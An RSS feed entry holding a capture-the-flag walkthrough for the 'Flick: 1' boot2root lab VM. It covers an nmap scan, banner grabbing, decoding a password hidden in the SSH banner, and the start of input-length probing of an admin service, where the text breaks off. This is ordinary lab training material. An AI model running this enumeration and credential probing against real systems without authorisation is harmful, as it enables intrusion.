@@ -1,0 +1,596 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Open-Security</title>
+    <description>Open-Security Resources.</description>
+    <link></link>
+    <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
+    
+      <item>
+        <title>Flick_1_workthrough</title>
+        <description>&lt;h1&gt;Flick: 1&lt;/h1&gt;
+
+&lt;hr&gt;
+
+&lt;p&gt;&lt;strong&gt;Author&lt;/strong&gt;: Leonjza&lt;br&gt;
+&lt;strong&gt;Links&lt;/strong&gt;: https://leonjza.github.io/blog/2014/08/07/flick-can-you-find-the-flag/  &lt;/p&gt;
+
+&lt;hr&gt;
+
+&lt;h2&gt;Description&lt;/h2&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt; .o88o. oooo   o8o            oooo
+ 888 `&amp;quot; `888   `&amp;quot;&amp;#39;            `888
+o888oo   888  oooo   .ooooo.   888  oooo
+ 888     888  `888  d88&amp;#39; `&amp;quot;Y8  888 .8P&amp;#39;
+ 888     888   888  888        888888.
+ 888     888   888  888   .o8  888 `88b.
+o888o   o888o o888o `Y8bod8P&amp;#39; o888o o888o
+
+Welcome to the flick boot2root!
+
+- Where is the flag?
+- What do you need to flick to find it?
+
+Completing &amp;quot;flick&amp;quot; will require some sound
+thinking, good enumeration skills &amp;amp; time! The
+objective is to find and read the flag that
+lives /root/
+
+As a bonus, can you get root command execution?
+
+Shoutout to @barrebas &amp;amp; @TheColonial for testing
+it out first :)
+
+$ sha1sum flick.ova
+0e65f5a1f2b560d10115796c1adfb03548583db2  flick.ova
+
+Good Luck!
+@leonjza
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;hr&gt;
+
+&lt;h2&gt;Workthrough&lt;/h2&gt;
+
+&lt;p&gt;Scan flick lab for open port(s) with nmap.   &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;lab:pentestlab/ $ nmap -v -n -T4 -p- 192.168.10.42
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-07-20 15:02 UTC
+Initiating Ping Scan at 15:02
+Scanning 192.168.10.42 [2 ports]
+Completed Ping Scan at 15:02, 0.00s elapsed (1 total hosts)
+Initiating Connect Scan at 15:02
+Scanning 192.168.10.42 [65535 ports]
+Discovered open port 22/tcp on 192.168.10.42
+Discovered open port 8881/tcp on 192.168.10.42
+Completed Connect Scan at 15:02, 4.25s elapsed (65535 total ports)
+Nmap scan report for 192.168.10.42
+Host is up (0.017s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8881/tcp open  unknown
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 4.35 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;Port: 22&lt;/h3&gt;
+
+&lt;p&gt;Use ncat for ssh banner view.  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;lab:pentestlab/ $ ncat -v 192.168.10.42 22
+Ncat: Version 6.47 ( http://nmap.org/ncat )
+Ncat: Connected to 192.168.10.42:22.
+SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.1
+^C
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Connect to port 22, and check the log.  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;lab:pentestlab/ $ ssh -v root@192.168.10.42
+OpenSSH_6.9p1, OpenSSL 1.0.2d 9 Jul 2015
+...
+debug1: kex: server-&amp;gt;client aes128-ctr umac-64@openssh.com none
+debug1: kex: client-&amp;gt;server aes128-ctr umac-64@openssh.com none
+debug1: sending SSH2_MSG_KEX_ECDH_INIT
+debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
+debug1: Server host key: ecdsa-sha2-nistp256 SHA256:OgFkTDTD/D7ndkanMRwJI92zYuzltDSkOS7E3sPlpPk
+The authenticity of host &amp;#39;192.168.10.42 (192.168.10.42)&amp;#39; can&amp;#39;t be established.
+ECDSA key fingerprint is SHA256:OgFkTDTD/D7ndkanMRwJI92zYuzltDSkOS7E3sPlpPk.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added &amp;#39;192.168.10.42&amp;#39; (ECDSA) to the list of known hosts.
+debug1: SSH2_MSG_NEWKEYS sent
+debug1: expecting SSH2_MSG_NEWKEYS
+debug1: SSH2_MSG_NEWKEYS received
+debug1: Roaming not allowed by server
+debug1: SSH2_MSG_SERVICE_REQUEST sent
+debug1: SSH2_MSG_SERVICE_ACCEPT received
+
+\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
+\x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
+\x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68
+\x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f
+\x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73
+\x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74
+\x52\x6c\x70\x57\x4d\x44\x45\x31\x56\x54\x4a\x30\x56\x31\x5a\x58\x53\x6b\x68\x68
+\x52\x7a\x6c\x56\x56\x6d\x78\x61\x4d\x31\x5a\x73\x57\x6d\x46\x6b\x52\x30\x35\x47
+\x57\x6b\x5a\x53\x54\x6d\x46\x36\x52\x54\x46\x57\x56\x45\x6f\x77\x56\x6a\x46\x61
+\x57\x46\x4e\x72\x61\x47\x68\x53\x65\x6d\x78\x57\x56\x6d\x70\x4f\x54\x30\x30\x78
+\x63\x46\x5a\x58\x62\x55\x5a\x72\x55\x6a\x41\x31\x52\x31\x64\x72\x57\x6e\x64\x57
+\x4d\x44\x46\x46\x55\x6c\x52\x47\x56\x31\x5a\x46\x62\x33\x64\x57\x61\x6b\x5a\x68
+\x56\x30\x5a\x4f\x63\x6d\x46\x48\x61\x46\x4e\x6c\x62\x58\x68\x58\x56\x6d\x30\x78
+\x4e\x46\x6c\x56\x4d\x48\x68\x58\x62\x6b\x35\x59\x59\x6c\x56\x61\x63\x6c\x56\x71
+\x51\x54\x46\x53\x4d\x57\x52\x79\x56\x32\x78\x4f\x56\x57\x4a\x56\x63\x45\x64\x5a
+\x4d\x46\x5a\x33\x56\x6a\x4a\x4b\x56\x56\x4a\x59\x5a\x46\x70\x6c\x61\x33\x42\x49
+\x56\x6d\x70\x47\x54\x32\x52\x57\x56\x6e\x52\x68\x52\x6b\x35\x73\x59\x6c\x68\x6f
+\x57\x46\x5a\x74\x4d\x58\x64\x55\x4d\x56\x46\x33\x54\x55\x68\x6f\x61\x6c\x4a\x73
+\x63\x46\x6c\x5a\x62\x46\x5a\x68\x59\x32\x78\x57\x63\x56\x46\x55\x52\x6c\x4e\x4e
+\x56\x6c\x59\x31\x56\x46\x5a\x53\x55\x31\x5a\x72\x4d\x58\x4a\x6a\x52\x6d\x68\x57
+\x54\x57\x35\x53\x4d\x31\x5a\x71\x53\x6b\x74\x57\x56\x6b\x70\x5a\x57\x6b\x5a\x77
+\x62\x47\x45\x7a\x51\x6b\x6c\x57\x62\x58\x42\x48\x56\x44\x4a\x53\x56\x31\x5a\x75
+\x55\x6d\x68\x53\x61\x7a\x56\x7a\x57\x57\x78\x6f\x62\x31\x64\x47\x57\x6e\x52\x4e
+\x53\x47\x68\x50\x55\x6d\x31\x34\x56\x31\x52\x56\x61\x47\x39\x58\x52\x30\x70\x79
+\x54\x6c\x5a\x73\x57\x6d\x4a\x47\x57\x6d\x68\x5a\x4d\x6e\x68\x58\x59\x7a\x46\x57
+\x63\x6c\x70\x47\x61\x47\x6c\x53\x4d\x31\x46\x36\x56\x6a\x4a\x30\x55\x31\x55\x78
+\x57\x6e\x4a\x4e\x57\x45\x70\x71\x55\x6d\x31\x6f\x56\x31\x52\x58\x4e\x56\x4e\x4e
+\x4d\x56\x70\x78\x55\x32\x74\x30\x56\x31\x5a\x72\x63\x46\x70\x58\x61\x31\x70\x33
+\x56\x6a\x46\x4b\x56\x32\x4e\x49\x62\x46\x64\x57\x52\x55\x70\x6f\x56\x6b\x52\x4b
+\x54\x32\x52\x47\x53\x6e\x4a\x61\x52\x6d\x68\x70\x56\x6a\x4e\x6f\x56\x56\x64\x57
+\x55\x6b\x39\x52\x4d\x57\x52\x48\x56\x32\x35\x53\x54\x6c\x5a\x46\x53\x6c\x68\x55
+\x56\x33\x68\x48\x54\x6c\x5a\x61\x57\x45\x35\x56\x4f\x56\x68\x53\x4d\x48\x42\x4a
+\x56\x6c\x64\x34\x63\x31\x64\x74\x53\x6b\x68\x68\x52\x6c\x4a\x58\x54\x55\x5a\x77
+\x56\x46\x5a\x71\x52\x6e\x64\x53\x4d\x56\x4a\x30\x5a\x55\x64\x73\x55\x32\x4a\x59
+\x59\x33\x68\x57\x61\x31\x70\x68\x56\x54\x46\x56\x65\x46\x64\x75\x53\x6b\x35\x58
+\x52\x58\x42\x78\x56\x57\x78\x6b\x4e\x47\x46\x47\x56\x58\x64\x68\x52\x55\x35\x55
+\x55\x6d\x78\x77\x65\x46\x55\x79\x64\x47\x46\x69\x52\x6c\x70\x7a\x56\x32\x78\x77
+\x57\x47\x45\x78\x63\x44\x4e\x5a\x61\x32\x52\x47\x5a\x57\x78\x47\x63\x6d\x4a\x47
+\x5a\x46\x64\x4e\x4d\x45\x70\x4a\x56\x6d\x74\x53\x53\x31\x55\x78\x57\x58\x68\x57
+\x62\x6c\x5a\x57\x59\x6c\x68\x43\x56\x46\x6c\x72\x56\x6e\x64\x57\x56\x6c\x70\x30
+\x5a\x55\x63\x35\x55\x6b\x31\x58\x55\x6e\x70\x57\x4d\x6a\x56\x4c\x56\x30\x64\x4b
+\x53\x46\x56\x74\x4f\x56\x56\x57\x62\x48\x42\x59\x56\x47\x78\x61\x59\x56\x64\x48
+\x56\x6b\x68\x6b\x52\x32\x68\x70\x55\x6c\x68\x42\x64\x31\x64\x57\x56\x6d\x39\x55
+\x4d\x56\x70\x30\x55\x6d\x35\x4b\x54\x31\x5a\x73\x53\x6c\x68\x55\x56\x6c\x70\x33
+\x56\x30\x5a\x72\x65\x46\x64\x72\x64\x47\x70\x69\x56\x6b\x70\x49\x56\x6c\x64\x34
+\x61\x32\x46\x57\x53\x6e\x52\x50\x56\x45\x35\x58\x54\x57\x35\x6f\x57\x46\x6c\x71
+\x53\x6b\x5a\x6c\x52\x6d\x52\x5a\x57\x6b\x55\x31\x56\x31\x5a\x73\x63\x46\x56\x58
+\x56\x33\x52\x72\x56\x54\x46\x73\x56\x31\x56\x73\x57\x6c\x68\x69\x56\x56\x70\x7a
+\x57\x57\x74\x61\x64\x32\x56\x47\x56\x58\x6c\x6b\x52\x45\x4a\x58\x54\x56\x5a\x77
+\x65\x56\x59\x79\x65\x48\x64\x58\x62\x46\x70\x58\x59\x30\x68\x4b\x56\x31\x5a\x46
+\x57\x6b\x78\x57\x4d\x56\x70\x48\x59\x32\x31\x4b\x52\x31\x70\x47\x5a\x45\x35\x4e
+\x52\x58\x42\x4b\x56\x6d\x31\x30\x55\x31\x4d\x78\x56\x58\x68\x58\x57\x47\x68\x68
+\x55\x30\x5a\x61\x56\x6c\x6c\x72\x57\x6b\x74\x6a\x52\x6c\x70\x78\x56\x47\x30\x35
+\x56\x31\x5a\x73\x63\x45\x68\x58\x56\x45\x35\x76\x59\x56\x55\x78\x57\x46\x56\x75
+\x63\x46\x64\x4e\x56\x32\x68\x32\x56\x31\x5a\x61\x53\x31\x49\x78\x54\x6e\x56\x52
+\x62\x46\x5a\x58\x54\x54\x46\x4b\x4e\x6c\x5a\x48\x64\x47\x46\x68\x4d\x6b\x35\x7a
+\x56\x32\x35\x53\x61\x31\x4a\x74\x55\x6e\x42\x57\x62\x47\x68\x44\x54\x6c\x5a\x6b
+\x56\x56\x46\x74\x52\x6d\x70\x4e\x56\x31\x49\x77\x56\x54\x4a\x30\x61\x31\x64\x48
+\x53\x6c\x68\x68\x52\x30\x5a\x56\x56\x6d\x78\x77\x4d\x31\x70\x58\x65\x48\x4a\x6c
+\x56\x31\x5a\x49\x5a\x45\x64\x30\x55\x32\x45\x7a\x51\x58\x64\x58\x62\x46\x5a\x68
+\x59\x54\x4a\x47\x56\x31\x64\x75\x53\x6d\x6c\x6c\x61\x31\x70\x59\x57\x57\x78\x6f
+\x51\x31\x52\x47\x55\x6e\x4a\x58\x62\x45\x70\x73\x55\x6d\x31\x53\x65\x6c\x6c\x56
+\x57\x6c\x4e\x68\x56\x6b\x70\x31\x55\x57\x78\x77\x56\x32\x4a\x59\x55\x6c\x68\x61
+\x52\x45\x5a\x72\x55\x6a\x4a\x4b\x53\x56\x52\x74\x61\x46\x4e\x57\x56\x46\x5a\x61
+\x56\x6c\x63\x78\x4e\x47\x51\x79\x56\x6b\x64\x57\x62\x6c\x4a\x72\x55\x6b\x56\x4b
+\x62\x31\x6c\x59\x63\x45\x64\x6c\x56\x6c\x4a\x7a\x56\x6d\x35\x4f\x57\x47\x4a\x47
+\x63\x46\x68\x5a\x4d\x47\x68\x4c\x56\x32\x78\x61\x57\x46\x56\x72\x5a\x47\x46\x57
+\x56\x31\x4a\x51\x56\x54\x42\x6b\x52\x31\x49\x79\x52\x6b\x68\x69\x52\x6b\x35\x70
+\x59\x54\x42\x77\x4d\x6c\x5a\x74\x4d\x54\x42\x56\x4d\x55\x31\x34\x56\x56\x68\x73
+\x56\x56\x64\x48\x65\x46\x5a\x5a\x56\x45\x5a\x33\x59\x55\x5a\x57\x63\x56\x4e\x74
+\x4f\x56\x64\x53\x62\x45\x70\x5a\x56\x47\x78\x6a\x4e\x57\x45\x79\x53\x6b\x64\x6a
+\x52\x57\x68\x58\x59\x6c\x52\x42\x4d\x56\x5a\x58\x63\x33\x68\x58\x52\x6c\x5a\x7a
+\x59\x55\x5a\x6b\x54\x6c\x59\x79\x61\x44\x4a\x57\x61\x6b\x4a\x72\x55\x7a\x46\x6b
+\x56\x31\x5a\x75\x53\x6c\x42\x57\x62\x48\x42\x76\x57\x56\x52\x47\x64\x31\x4e\x57
+\x57\x6b\x68\x6c\x52\x30\x5a\x61\x56\x6d\x31\x53\x52\x31\x52\x73\x57\x6d\x46\x56
+\x52\x6c\x6c\x35\x59\x55\x5a\x6f\x57\x6c\x64\x49\x51\x6c\x68\x56\x4d\x46\x70\x68
+\x59\x31\x5a\x4f\x63\x56\x56\x73\x57\x6b\x35\x57\x4d\x55\x6c\x33\x56\x6c\x52\x4b
+\x4d\x47\x49\x79\x52\x6b\x64\x54\x62\x6b\x35\x55\x59\x6b\x64\x6f\x56\x6c\x5a\x73
+\x57\x6e\x64\x4e\x4d\x56\x70\x79\x56\x32\x31\x47\x61\x6c\x5a\x72\x63\x44\x42\x61
+\x52\x57\x51\x77\x56\x6a\x4a\x4b\x63\x6c\x4e\x72\x61\x46\x64\x53\x4d\x32\x68\x6f
+\x56\x6b\x52\x4b\x52\x31\x59\x78\x54\x6e\x56\x56\x62\x45\x4a\x58\x55\x6c\x52\x57
+\x57\x56\x64\x57\x55\x6b\x64\x6b\x4d\x6b\x5a\x48\x56\x32\x78\x57\x55\x32\x45\x78
+\x63\x48\x4e\x56\x62\x54\x46\x54\x5a\x57\x78\x73\x56\x6c\x64\x73\x54\x6d\x68\x53
+\x56\x45\x5a\x61\x56\x56\x63\x31\x62\x31\x59\x78\x57\x58\x70\x68\x53\x45\x70\x61
+\x59\x57\x74\x61\x63\x6c\x56\x71\x52\x6c\x64\x6a\x4d\x6b\x5a\x47\x54\x31\x5a\x6b
+\x56\x31\x5a\x47\x57\x6d\x46\x57\x62\x47\x4e\x34\x54\x6b\x64\x52\x65\x56\x5a\x72
+\x5a\x46\x64\x69\x62\x45\x70\x79\x56\x57\x74\x57\x53\x32\x49\x78\x62\x46\x6c\x6a
+\x52\x57\x52\x73\x56\x6d\x78\x4b\x65\x6c\x5a\x74\x4d\x44\x56\x58\x52\x30\x70\x48
+\x59\x30\x5a\x6f\x57\x6b\x31\x48\x61\x45\x78\x57\x4d\x6e\x68\x68\x56\x30\x5a\x57
+\x63\x6c\x70\x48\x52\x6c\x64\x4e\x4d\x6d\x68\x4a\x56\x31\x52\x4a\x65\x46\x4d\x78
+\x53\x58\x68\x6a\x52\x57\x52\x68\x55\x6d\x73\x31\x57\x46\x59\x77\x56\x6b\x74\x4e
+\x62\x46\x70\x30\x59\x30\x56\x6b\x57\x6c\x59\x77\x56\x6a\x52\x57\x62\x47\x68\x76
+\x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34
+\x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58
+\x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57
+\x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36
+\x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77
+\x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d
+
+ .o88o. oooo   o8o            oooo        
+ 888 `&amp;quot; `888   `&amp;quot;&amp;#39;            `888        
+o888oo   888  oooo   .ooooo.   888  oooo  
+ 888     888  `888  d88&amp;#39; `&amp;quot;Y8  888 .8P&amp;#39;   
+ 888     888   888  888        888888.    
+ 888     888   888  888   .o8  888 `88b.  
+o888o   o888o o888o `Y8bod8P&amp;#39; o888o o888o 
+
+
+debug1: Authentications that can continue: publickey,password
+debug1: Next authentication method: publickey
+debug1: Trying private key: /home/notfound/.ssh/id_rsa
+debug1: Trying private key: /home/notfound/.ssh/id_dsa
+debug1: Trying private key: /home/notfound/.ssh/id_ecdsa
+debug1: Trying private key: /home/notfound/.ssh/id_ed25519
+debug1: Next authentication method: password
+root@192.168.10.42&amp;#39;s password: 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;decode hex string, we can get this:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;we guesse that the string is encoded by base64. So we create py script to decode it.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;#!/usr/bin/env python2
+# -*- coding: utf8 -*-
+
+import base64
+
+
+def decode(data):
+    n = 0
+    while True:
+        try:
+            data = base64.b64decode(data)
+        except TypeError:
+            n = n - 1
+            break
+        else:
+            n = n + 1
+
+    data = base64.b64encode(data)
+    return n, data
+
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    enc_str = &amp;quot;Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==&amp;quot;
+    print &amp;quot;[+] decode %d times: %s&amp;quot; % decode(enc_str)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;run the command as follow:  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;lab:flick/ $ python decode.py 
+[+] decode 16 times: tabupJievas8Knoj
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;try to login ssh with password &amp;ldquo;&lt;strong&gt;tabupJievas8Knoj&lt;/strong&gt;&amp;rdquo;,  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;root@192.168.10.42&amp;#39;s password: 
+Permission denied, please try again.
+root@192.168.10.42&amp;#39;s password: 
+Permission denied, please try again.
+root@192.168.10.42&amp;#39;s password: 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;Port: 8881&lt;/h3&gt;
+
+&lt;p&gt;connect to port 8881 with ncat,  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;lab:pentestlab/ $ ncat -v 192.168.10.42 8881
+Ncat: Version 6.47 ( http://nmap.org/ncat )
+Ncat: Connected to 192.168.10.42:8881.
+Welcome to the admin server. A correct password will &amp;#39;flick&amp;#39; the switch and open a new door:
+&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;try to input different length string as follow:  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; Ncat: 2 bytes sent, 104 bytes received in 0.03 seconds.
+lab:pentestlab/ $ python2 -c &amp;#39;print &amp;quot;A&amp;quot;&amp;#39; | ncat 192.168.10.42 8881
+Welcome to the admin server. A correct password will &amp;#39;flick&amp;#39; the switch and open a new door:
+&amp;gt; OK: A
+
+&amp;gt; lab:pentestlab/ $ python2 -c &amp;#39;print &amp;quot;A&amp;quot; * 2&amp;#39; | ncat 192.168.10.42 8881
+Welcome to the admin server. A correct password will &amp;#39;flick&amp;#39; the switch and open a new door:
+&amp;gt; OK: AA
+
